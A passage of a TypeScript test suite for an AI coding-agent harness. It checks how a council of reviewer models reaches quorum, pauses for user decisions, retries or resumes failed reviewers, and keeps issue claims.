      h.agentBehavior.set(phase, (req) => {
        writeFileSync(req.resultPath, JSON.stringify(phaseDefaults[phase]), 'utf8');
        return null;
      });
    }

    await runHarnessDriver(h.host, { ...input, roles }, h.deps);

    const models = loadLedger(h.host.dataDir, h.host.runId)?.models ?? [];
    expect(models.length).toBeGreaterThan(0);
    expect(models.every((m) => typeof m.family === 'string' && m.family.length > 0)).toBe(true);
    expect(models.every((m) => typeof m.runner === 'string')).toBe(true);
    const claude = models.find((m) => m.id.startsWith('claude/'));
    expect(claude?.family).toBe('anthropic');
    const codex = models.find((m) => m.id.startsWith('codex/'));
    expect(codex?.family).toBe('openai');
  });

  it('merges findings from the structured council into one attributed fix round', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: {
        verdict: 'request_changes',
        reviewers: ids.map((id) => ({
          id,
          status: 'completed',
          review: {
            verdict: 'request_changes',
            findings: [{ severity: 'blocker', title: 'race remains', location: 'src/a.ts:1' }],
          },
        })),
      },
    }));
    let fixPrompt = '';
    h.agentBehavior.set('fix-2', (req) => {
      fixPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
      return null;
    });

    await runHarnessDriver(h.host, { ...input, roles }, h.deps);

    expect(fixPrompt).toContain('race remains');
    expect(fixPrompt).toContain('src/a.ts:1');
  });

  /* ---- council resilience (2026-07-25) ---- */

  const threeReviewerInput = {
    ...input,
    roles: {
      ...roles,
      reviewers: [
        { runner: 'claude' as const, model: 'opus' },
        { runner: 'codex' as const, model: 'gpt-5.6-sol' },
        { runner: 'codex' as const, model: 'gpt-5.5-mini' },
      ],
    },
  };

  /**
   * Regression (run 0fe16fb7, 2026-07-28): a spec council with two completed
   * reviewers across two families was discarded because a third small model
   * flubbed the result-file contract. One flaky reviewer must never void a run:
   * picker-selected roles default to quorum — ≥2 completed across ≥2 families
   * proceeds, DEGRADED and loud, with the missing reviewer named.
   */
  it('proceeds degraded when one council reviewer fails but quorum holds', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: {
        verdict: 'approve',
        reviewers: ids.map((id) => ({
          id,
          status: id.includes('mini') ? 'failed' : 'completed',
          ...(id.includes('mini') ? {} : { review: { verdict: 'approve', findings: [] } }),
        })),
      },
    }));

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toBeNull();
    expect(h.calls.map((c) => c.id)).toContain('stage');
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('DEGRADED') && n.includes('mini'))).toBe(true);
  });

  it('resumes a partial council without rerunning completed paid reviewers', async () => {
    const h = makeHarness(dir);
    const councilCalls: string[][] = [];
    h.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id) => ({
            id,
            // A timeout gets no in-round retry, so the first run pauses and the resume is exercised.
            status: councilCalls.length === 1 ? 'timeout' : 'completed',
            ...(councilCalls.length === 1
              ? {}
              : { review: { verdict: 'approve', findings: [] } }),
          })),
        },
      };
    });

    const first = await runHarnessDriver(h.host, threeReviewerInput, h.deps);
    expect(first).toMatch(/quorum/i);
    const second = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(second).toBeNull();
    expect(councilCalls).toHaveLength(2);
    expect(councilCalls[0]).toEqual(
      expect.arrayContaining(['cez-codex-gpt-5.6-sol', 'cez-codex-gpt-5.5-mini']),
    );
    expect(councilCalls[1]).toEqual(
      expect.arrayContaining(['cez-codex-gpt-5.6-sol', 'cez-codex-gpt-5.5-mini']),
    );
    expect(h.calls.filter((call) => call.kind === 'agent' && call.id === 'review')).toHaveLength(1);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(
      ledger?.invocations.filter(
        (invocation) =>
          invocation.status === 'completed' && invocation.role === 'reviewer',
      ),
    ).toHaveLength(3);
  });

  // advisors lost their in-round retry when the runtime's own loop was disabled.
  it('retries an advisor that failed retryably once within the round', async () => {
    const h = makeHarness(dir);
    const councilCalls: string[][] = [];
    h.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id, index) => ({
            id,
            ...(councilCalls.length === 1 && index === 0
              ? { status: 'failed' }
              : { status: 'completed', review: { verdict: 'approve', findings: [] } }),
          })),
        },
      };
    });

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(councilCalls).toHaveLength(2);
    expect(councilCalls[1]).toEqual([councilCalls[0]![0]]);
  });

  // one advisor's oversized review voided every advisor in the op.
  it('reads each advisor review on its own and clamps an oversized one', async () => {
    const h = makeHarness(dir);
    const findings = Array.from({ length: 60 }, (_, index) => ({
      severity: 'minor',
      title: `nit ${index}`,
      evidence: 'e'.repeat(5_000),
    }));
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: {
        verdict: 'approve',
        reviewers: ids.map((id, index) => ({
          id,
          status: 'completed',
          review: index === 0 ? { verdict: 'approve', findings } : { verdict: 'approve', findings: [] },
        })),
      },
    }));

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    const council = loadLedger(h.host.dataDir, h.host.runId)?.councils.find((entry) => entry.kind === 'implementation');
    const rows = (council?.reviewers ?? []) as Array<Record<string, unknown>>;
    const advisors = rows.filter((row) => String(row.id).startsWith('codex/'));
    expect(advisors.map((row) => row.status)).toEqual(['completed', 'completed']);
  });

  // an op error marked every advisor failed, discarding reviews it had reused.
  it('keeps a reused advisor review when the re-run op errors', async () => {
    const h = makeHarness(dir);
    let call = 0;
    h.setCouncilBehavior((ids) => {
      call += 1;
      if (call > 1) return { ok: false, stderr: 'advisor op crashed after a timeout' };
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id, index) => ({
            id,
            ...(index === 0
              ? { status: 'completed', review: { verdict: 'approve', findings: [] } }
              : { status: 'timeout' }),
          })),
        },
      };
    });
    let sessionReviews = 0;
    h.agentBehavior.set('review', (req) => {
      sessionReviews += 1;
      if (sessionReviews === 1) return 'claude timed out after 30m and was stopped';
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    const reviewersOf = () =>
      (loadLedger(h.host.dataDir, h.host.runId)?.councils.find((entry) => entry.kind === 'implementation')?.reviewers ??
        []) as Array<Record<string, unknown>>;
    const firstAdvisor = reviewersOf().find((row) => String(row.id).startsWith('codex/') && row.status === 'completed')?.id;

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(firstAdvisor).toBeDefined();
    expect(reviewersOf().find((row) => row.id === firstAdvisor)?.status).toBe('completed');
  });

  /* ---- council decisions (2026-07-29): quorum failures the user resolves ---- */

  /** Structured reviewer transports permanently down: every council op
   *  answers with both non-session members failed. */
  const advisorsAlwaysFail = (h: ReturnType<typeof makeHarness>, status = 'failed') => {
    const councilCalls: string[][] = [];
    h.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id) => ({ id, status })),
        },
      };
    });
    return councilCalls;
  };

  /** What the council-decision route records for the ledger's paused council. */
  const recordedDecisionDetail = (ledger: NonNullable<ReturnType<typeof loadLedger>>): string => {
    const pending = ledger.outcome.pendingDecision;
    if (pending?.kind !== 'council') throw new Error('no council decision is pending');
    return councilDecisionDetail(pending);
  };

  // a stopped reviewer records no outcome, so the survivors alone looked
  // "below quorum" and a cancelled run was parked on a decision, still holding its claim.
  it('does not park a run stopped mid-council on a below-quorum decision', async () => {
    let cancelled = false;
    const h = makeHarness(dir);
    h.host.isCancelled = () => cancelled;
    // One council member completes and the rest fail, so the session reviewer's outcome
    // decides quorum — and Stop lands after the council finished, while that session still runs.
    let councilFinished!: () => void;
    const councilRan = new Promise<void>((resolve) => {
      councilFinished = resolve;
    });
    h.setCouncilBehavior((ids) => {
      councilFinished();
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id, index) =>
            index === 0
              ? { id, status: 'completed', review: { verdict: 'approve', findings: [] } }
              : { id, status: 'failed' },
          ),
        },
      };
    });
    h.agentBehavior.set('review', async () => {
      await councilRan;
      await new Promise((resolve) => setTimeout(resolve, 50));
      cancelled = true;
      return null;
    });

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.outcome.pendingDecision).toBeUndefined();
    expect(ledger?.outcome.status).not.toBe('blocked');
    expect(h.calls.map((call) => call.id)).not.toContain('stage');
  });

  it('pauses below quorum with a decision instead of just dying', async () => {
    const h = makeHarness(dir);
    advisorsAlwaysFail(h);

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toMatch(/did not reach quorum/);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.outcome.status).toBe('blocked');
    // The survivor (the claude session reviewer) makes "proceed" a real option.
    expect(ledger?.outcome.pendingDecision).toMatchObject({
      kind: 'council',
      council: 'implementation',
      round: 1,
      completedCount: 1,
      canProceed: true,
    });
    expect(
      ledger?.outcome.pendingDecision?.kind === 'council'
        ? ledger.outcome.pendingDecision.failed
        : [],
    ).toHaveLength(2);
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('paused for your decision'))).toBe(true);
  });

  // releasing on a decision park let another run claim the issue.
  it('keeps the issue claim while the run is parked on a council decision', async () => {
    const h = makeHarness(dir);
    advisorsAlwaysFail(h);
    const released: string[] = [];
    h.deps.releaseClaim = (path) => {
      released.push(path);
      return { ok: true };
    };

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/did not reach quorum/);

    expect(released).toEqual([]);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.claim).toMatchObject({ held: true, issueId: '642' });
  });

  it('still releases the issue claim when a run fails without a decision to make', async () => {
    const h = makeHarness(dir);
    const released: string[] = [];
    h.deps.releaseClaim = (path) => {
      released.push(path);
      return { ok: true };
    };
    h.agentBehavior.set('implement', (req) => {
      writeFileSync(req.resultPath, '{"not":"the contract"}', 'utf8');
      return null;
    });

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/produced no valid result/);

    expect(released).toHaveLength(1);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.claim?.held).toBe(false);
  });

  it('a recorded proceed decision continues with the survivors, loudly', async () => {
    const h = makeHarness(dir);
    // A timeout leaves each advisor one attempt short, so a decision that bought one would show.
    const councilCalls = advisorsAlwaysFail(h, 'timeout');
    // Decided at the FIRST pause: pre-spending the budget with an extra resume hid that the
    // decision used to buy the failed advisors a second paid attempt.
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);

    const decided = loadLedger(h.host.dataDir, h.host.runId)!;
    decided.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.proceed',
      by: 'user',
      detail: recordedDecisionDetail(decided),
    });
    saveLedger(h.host.dataDir, h.host.runId, decided);

    const resumed = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(resumed).toBeNull();
    expect(h.calls.map((c) => c.id)).toContain('stage');
    // The decision never buys another advisor attempt.
    expect(councilCalls).toHaveLength(1);
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.outcome.status).toBe('ready');
    expect(ledger?.outcome.pendingDecision).toBeUndefined();
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('proceeds WITHOUT quorum'))).toBe(true);
  });

  it('a recorded proceed decision never re-runs a session reviewer that already failed', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: {
        verdict: 'approve',
        reviewers: ids.map((id) => ({ id, status: 'completed', review: { verdict: 'approve', findings: [] } })),
      },
    }));
    // A timeout is never retried, so the first pause leaves this reviewer one attempt short.
    let sessionReviews = 0;
    h.agentBehavior.set('review', () => {
      sessionReviews += 1;
      return 'claude timed out after 30m and was stopped';
    });
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    expect(sessionReviews).toBe(1);

    const decided = loadLedger(h.host.dataDir, h.host.runId)!;
    decided.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.proceed',
      by: 'user',
      detail: recordedDecisionDetail(decided),
    });
    saveLedger(h.host.dataDir, h.host.runId, decided);

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(sessionReviews).toBe(1);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.status).toBe('ready');
  });

  it('a recorded proceed decision skips a usage-limited reviewer, though its attempt was not spent', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: {
        verdict: 'approve',
        reviewers: ids.map((id) => ({ id, status: 'completed', review: { verdict: 'approve', findings: [] } })),
      },
    }));
    let sessionReviews = 0;
    h.agentBehavior.set('review', () => {
      sessionReviews += 1;
      return `Claude AI usage limit reached|${Math.floor(Date.now() / 1000) + 3600}`;
    });
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    expect(sessionReviews).toBe(1);

    const decided = loadLedger(h.host.dataDir, h.host.runId)!;
    decided.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.proceed',
      by: 'user',
      detail: recordedDecisionDetail(decided),
    });
    saveLedger(h.host.dataDir, h.host.runId, decided);

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(sessionReviews).toBe(1);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.status).toBe('ready');
  });

  it('[round3-4] recorded proceed never buys a usage-limited advisor another invocation', async () => {
    const h = makeHarness(dir);
    const calls: string[][] = [];
    h.setCouncilBehavior((ids) => {
      calls.push(ids);
      return { ok: true, result: { reviewers: ids.map((id) => ({ id, status: 'failed', error: 'provider usage limit reached' })) } };
    });
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    const ledger = loadLedger(h.host.dataDir, h.host.runId)!;
    expect(ledger.invocations.filter((row) => row.id.startsWith('advisor:')).every((row) => row.status === 'interrupted' && row.attempt === 1)).toBe(true);
    ledger.decisions.push({ at: new Date().toISOString(), kind: 'council.proceed', by: 'user', detail: recordedDecisionDetail(ledger) });
    saveLedger(h.host.dataDir, h.host.runId, ledger);
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(calls).toHaveLength(1);
  });

  it('guard: without proceed an interrupted advisor can run on Continue', async () => {
    const h = makeHarness(dir);
    let calls = 0;
    let limited = true;
    h.setCouncilBehavior((ids) => {
      calls += 1;
      return limited
        ? { ok: true, result: { reviewers: ids.map((id) => ({ id, status: 'failed', error: 'provider usage limit reached' })) } }
        : undefined;
    });
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    limited = false;
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toBeNull();
    expect(calls).toBe(2);
  });

  it('a recorded retry decision buys the failed reviewers one more attempt', async () => {
    const h = makeHarness(dir);
    const councilCalls: string[][] = [];
    h.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      const succeed = councilCalls.length >= 3;
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id) => ({
            id,
            status: succeed ? 'completed' : 'failed',
            ...(succeed ? { review: { verdict: 'approve', findings: [] } } : {}),
          })),
        },
      };
    });

    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    // Budget of 2 spent: a plain resume must NOT pay for a third attempt.
    expect(await runHarnessDriver(h.host, threeReviewerInput, h.deps)).toMatch(/quorum/);
    expect(councilCalls).toHaveLength(2);

    const decided = loadLedger(h.host.dataDir, h.host.runId)!;
    decided.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.retry',
      by: 'user',
      detail: recordedDecisionDetail(decided),
    });
    saveLedger(h.host.dataDir, h.host.runId, decided);

    const resumed = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(resumed).toBeNull();
    expect(councilCalls).toHaveLength(3);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.outcome.status).toBe('ready');
  });

  it('requires a new quorum decision after feedback supersedes the accepted handoff', async () => {
    const first = makeHarness(dir);
    advisorsAlwaysFail(first);
    expect(await runHarnessDriver(first.host, threeReviewerInput, first.deps)).toMatch(/quorum/);
    const waived = loadLedger(first.host.dataDir, first.host.runId)!;
    waived.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.proceed',
      by: 'user',
      detail: recordedDecisionDetail(waived),
    });
    saveLedger(first.host.dataDir, first.host.runId, waived);
    expect(await runHarnessDriver(first.host, threeReviewerInput, first.deps)).toBeNull();

    const updated = loadLedger(first.host.dataDir, first.host.runId)!;
    updated.pendingMessages.push({
      id: 'feedback-after-waiver',
      text: 'Change the implementation to preserve empty queues.',
      createdAt: new Date().toISOString(),
    });
    saveLedger(first.host.dataDir, first.host.runId, updated);
    const resumed = makeHarness(dir);
    advisorsAlwaysFail(resumed);

    expect(await runHarnessDriver(resumed.host, threeReviewerInput, resumed.deps)).toMatch(/quorum/);
    expect(resumed.calls.map((call) => call.id)).toContain('implement');
    expect(resumed.ops.map((call) => call.id)).not.toContain('stage');
    expect(loadLedger(first.host.dataDir, first.host.runId)?.outcome)
      .toMatchObject({ status: 'blocked', pendingDecision: { kind: 'council', canProceed: true } });
  });

  it('applies a council decision only to the diff the paused round reviewed', async () => {
    let subject = 'the-diff-the-user-saw';
    const first = makeHarness(dir);
    first.deps.snapshotReviewSubject = async () => subject;
    advisorsAlwaysFail(first);
    expect(await runHarnessDriver(first.host, threeReviewerInput, first.deps)).toMatch(/quorum/);
    const decided = loadLedger(first.host.dataDir, first.host.runId)!;
    decided.decisions.push({
      at: new Date().toISOString(),
      kind: 'council.proceed',
      by: 'user',
      detail: recordedDecisionDetail(decided),
    });
    saveLedger(first.host.dataDir, first.host.runId, decided);

    subject = 'edited-after-the-decision';
    const resumed = makeHarness(dir);
    resumed.deps.snapshotReviewSubject = async () => subject;
    advisorsAlwaysFail(resumed);

    expect(await runHarnessDriver(resumed.host, threeReviewerInput, resumed.deps)).toMatch(/quorum/);

    expect(resumed.ops.map((call) => call.id)).not.toContain('stage');
    expect(loadLedger(first.host.dataDir, first.host.runId)?.outcome.pendingDecision).toMatchObject({
      kind: 'council',
      council: 'implementation',
      round: 1,
      subjectSha256: 'edited-after-the-decision',
    });
  });

  /** Spec council round 1 objects through the structured reviewer, every later council approves. */
  const featureRun = (h: ReturnType<typeof makeHarness>) => {
    const specFile = join(dir, '.ai', 'specs', 'feat.md');
    let councils = 0;
    h.setCouncilBehavior((ids) => {
      councils += 1;
      const objecting = councils === 1;
      return {
        ok: true,
        result: {
          verdict: objecting ? 'request_changes' : 'approve',
          reviewers: ids.map((id) => ({
            id,
            status: 'completed',
            review: objecting
              ? { verdict: 'request_changes', findings: [{ severity: 'major', title: 'no rollback plan' }] }
              : { verdict: 'approve', findings: [] },
          })),
        },
      };
    });
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(dirname(specFile), { recursive: true });
      writeFileSync(specFile, '# feat\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'original summary', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
        'utf8',
      );
      return null;
    });
    const revise = (req: HarnessAgentPhaseRequest) => {
      writeFileSync(specFile, '# feat\n\n## Rollback\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'revised summary', specPath: '.ai/specs/feat.md', files: [] }),
        'utf8',
      );
      return null;
    };
    h.agentBehavior.set('spec-2', revise);
    return { specFile, revise };
  };
  const featureInput = { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles };

  it('resumes after the spec loop without re-auditing the revised spec or re-running implement', async () => {
    const first = makeHarness(dir);
    featureRun(first);
    let gate = 0;
    first.deps.validate = async (commands: string[]) => {
      gate += 1;
      if (gate === 2) throw new Error('validation host went away');
      return commands.map((command) => ({ command, status: 'passed' as const, exitCode: 0, evidence: 'ok' }));
    };
    expect(await runHarnessDriver(first.host, featureInput, first.deps)).toMatch(/validation host went away/);
    expect(first.calls.map((call) => call.id)).toContain('spec-2');

    const resumed = makeHarness(dir);
    const councilCalls: string[][] = [];
    resumed.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      return undefined;
    });

    expect(await runHarnessDriver(resumed.host, featureInput, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id)).toEqual(['review']);
    expect(councilCalls).toHaveLength(1);
    const ledger = loadLedger(resumed.host.dataDir, resumed.host.runId);
    expect(ledger?.rounds?.spec).toMatchObject({ done: true, summary: 'revised summary' });
    expect(ledger?.stage.prBody).toContain('revised summary');
  });

  it('resumes an interrupted spec revision without re-auditing the half-revised spec', async () => {
    const first = makeHarness(dir);
    const { specFile, revise } = featureRun(first);
    first.agentBehavior.set('spec-2', () => {
      writeFileSync(specFile, '# feat\n\n## Rollb', 'utf8');
      return 'claude exited mid-revision';
    });
    expect(await runHarnessDriver(first.host, featureInput, first.deps)).toMatch(/spec-2/);

    const resumed = makeHarness(dir);
    featureRun(resumed);
    let revisePrompt = '';
    resumed.agentBehavior.set('spec-2', (req) => {
      revisePrompt = req.prompt;
      return revise(req);
    });
    const councilCalls: string[][] = [];
    resumed.setCouncilBehavior((ids) => {
      councilCalls.push(ids);
      return undefined;
    });

    expect(await runHarnessDriver(resumed.host, featureInput, resumed.deps)).toBeNull();

    expect(resumed.calls.filter((call) => call.kind === 'agent').map((call) => call.id)).toEqual([
      'spec-2',
      'spec-review-2',
      'implement',
      'review',
    ]);
    expect(revisePrompt).toContain('no rollback plan');
    expect(councilCalls).toHaveLength(2);
  });

  it('offers only retry when every reviewer failed', async () => {
    const h = makeHarness(dir);
    advisorsAlwaysFail(h);
    h.agentBehavior.set('review', (req) => {
      writeFileSync(req.resultPath, 'prose, not the contract', 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toMatch(/did not reach quorum/);
    const pending = loadLedger(h.host.dataDir, h.host.runId)?.outcome.pendingDecision;
    expect(pending).toMatchObject({ kind: 'council', completedCount: 0, canProceed: false });
    expect(pending?.kind === 'council' ? pending.failed : []).toHaveLength(3);
  });

  /** The runner-session pool and the advisor council must run CONCURRENTLY
   *  (2026-07-29): the session reviewer here refuses to finish until the
   *  advisor op has been observed starting. Under the old sequential order
   *  that observation never happens and the flag stays false. */
  // a rejected runner pool used to strand the advisor promise unhandled. A
  // runner reviewer's own crash is now contained as its outcome, so the advisor's failure is the one
  // that propagates, still with nothing left unhandled.
  for (const workflow of [HARNESS_FIX_ISSUE, HARNESS_IMPLEMENT_FEATURE]) {
    it(`settles both council groups before a council failure propagates (${workflow})`, async () => {
      const h = makeHarness(dir);
      const strays: unknown[] = [];
      const onStray = (reason: unknown) => strays.push(reason);
      process.on('unhandledRejection', onStray);
      const fakeRuntime = h.deps.createRuntime!;
      h.deps.createRuntime = (opts) => {
        const runtime = fakeRuntime(opts);
        return {
          kill: () => runtime.kill(),
          run: async (op, args, runOpts) => {
            if (op === 'review') throw new Error('council transport died');
            return runtime.run(op, args, runOpts);
          },
        };
      };
      const emit = h.host.emit;
      h.host.emit = (event) => {
        const invocation = event.invocation as { id?: string; status?: string } | undefined;
        if (invocation?.id?.startsWith('advisor:') && invocation.status === 'failed') {
          throw new Error('advisor ledger write failed');
        }
        emit(event);
      };
      for (const phase of ['review', 'spec-review']) {
        h.agentBehavior.set(phase, () => {
          throw new Error('runner reviewer crashed');
        });
      }
      h.agentBehavior.set('spec', (req) => {
        mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
        writeFileSync(join(dir, '.ai', 'specs', 'f.md'), '# spec\n', 'utf8');
        writeFileSync(
          req.resultPath,
          JSON.stringify({ summary: 's', specPath: '.ai/specs/f.md', files: ['.ai/specs/f.md'] }),
          'utf8',
        );
        return null;
      });
      try {
        await expect(runHarnessDriver(h.host, { ...input, workflow }, h.deps)).rejects.toThrow(
          'advisor ledger write failed',
        );
        await new Promise((resolve) => setTimeout(resolve, 20));
        expect(strays).toEqual([]);
        expect(
          loadLedger(h.host.dataDir, h.host.runId)?.invocations.find((invocation) =>
            invocation.id.startsWith('reviewer:'),
          ),
        ).toMatchObject({ status: 'failed', error: expect.stringContaining('runner reviewer crashed') });
      } finally {
        process.off('unhandledRejection', onStray);
      }
    });
  }

  it('launches the advisor council alongside the runner reviewers', async () => {
    const h = makeHarness(dir);
    let advisorStartedDuringSessionReview = false;
    h.agentBehavior.set('review', async (req) => {
      const deadline = Date.now() + 4_000;
      while (Date.now() < deadline) {
        if (h.ops.some((op) => op.id === 'review')) {
          advisorStartedDuringSessionReview = true;
          break;
        }
        await new Promise((resolve) => setTimeout(resolve, 25));
      }
      writeFileSync(
        req.resultPath,
        JSON.stringify({ verdict: 'approve', findings: [] }),
        'utf8',
      );
      return null;
    });

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toBeNull();
    expect(advisorStartedDuringSessionReview).toBe(true);
  }, 20_000);

  it('recovers a valid council result rejected by a shared subject-change false positive', async () => {
    const h = makeHarness(dir);
    let subject = 'stable-review-subject';
    let councilCalls = 0;
    h.deps.snapshotReviewSubject = async () => subject;
    h.setCouncilBehavior((ids) => {
      councilCalls += 1;
      subject = `changed-during-council-${councilCalls}`;
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: ids.map((id) => ({
            id,
            status: 'completed',
            review: { verdict: 'approve', findings: [] },
          })),
        },
      };
    });

    const first = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(first).toMatch(/review subject changed/i);
    expect(first).not.toMatch(/reviewer mutated/i);
    expect(councilCalls).toBe(2);

    const failedLedger = loadLedger(h.host.dataDir, h.host.runId)!;
    for (const invocation of failedLedger.invocations) {
      if (invocation.id.startsWith('advisor:impl:')) {
        invocation.error =
          'advisor reviewer mutated the worktree or index; every result from this council was rejected and the changed subject was preserved for manual recovery';
      }
    }
    saveLedger(h.host.dataDir, h.host.runId, failedLedger);

    subject = 'changed-during-council-1';
    h.setCouncilBehavior(() => {
      throw new Error('the recovered council must not invoke reviewers again');
    });

    await expect(runHarnessDriver(h.host, threeReviewerInput, h.deps)).resolves.toBeNull();

    expect(councilCalls).toBe(2);
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.filter((invocation) =>
        invocation.id.startsWith('advisor:impl:'),
      ),
    ).toEqual([
      expect.objectContaining({ status: 'completed', artifactSha256: expect.any(String) }),
      expect.objectContaining({ status: 'completed', artifactSha256: expect.any(String) }),
    ]);
    expect(
      h.events.some(
        (event) =>
          event.type === 'note' &&
          String(event.message).includes('no model rerun was needed'),
      ),
    ).toBe(true);
  });

  it('refuses when required reviewers do not complete', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior((ids) => ({
      ok: true,
      result: { verdict: 'approve', reviewers: ids.map((id) => ({ id, status: 'failed' })) },
    }));

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toMatch(/quorum/);
    expect(error).toMatch(/needs at least 2/);
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
  });

  it('keeps the completed reviewers when the council op itself fails', async () => {
    const h = makeHarness(dir);
    h.setCouncilBehavior(() => ({ ok: false, stderr: 'runtime exploded' }));

    const error = await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(error).toMatch(/quorum/);
    expect(error).toMatch(/runtime exploded|no valid review/);
  });

  /**
   * Regression (run 475853b0): round three was treated as a terminal verdict,
   * so Cezar paid to discover factual spec defects and then refused to schedule
   * the corresponding repair. The budget is three audit-and-repair cycles:
   * findings from audit three must reach spec-4, with no fourth audit.
   */
  it('applies the third pre-implementation council findings before implementation', async () => {
    const h = makeHarness(dir);
    let round = 0;
    h.setCouncilBehavior((ids) => {
      round += 1;
      // Calls 1–3 are spec audits and calls 4–6 are implementation reviews.
      // Every paid review cycle objects, so both terminal repairs must run.
      const stillObjecting = round <= 6;
      return {
        ok: true,
        result: {
          verdict: stillObjecting ? 'request_changes' : 'approve',
          reviewers: ids.map((id, i) => ({
            id,
            status: 'completed',
            review:
              stillObjecting && i === 0
                ? {
                    verdict: 'request_changes',
                    findings: [{ severity: 'major', title: `fresh objection ${round}` }],
                  }
                : { verdict: 'approve', findings: [] },
          })),
        },
      };
    });
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feat\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('spec-2', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's2', specPath: '.ai/specs/feat.md', files: [] }),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('spec-3', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's3', specPath: '.ai/specs/feat.md', files: [] }),
        'utf8',
      );
      return null;
    });
    h.agentBehavior.set('spec-4', (req) => {
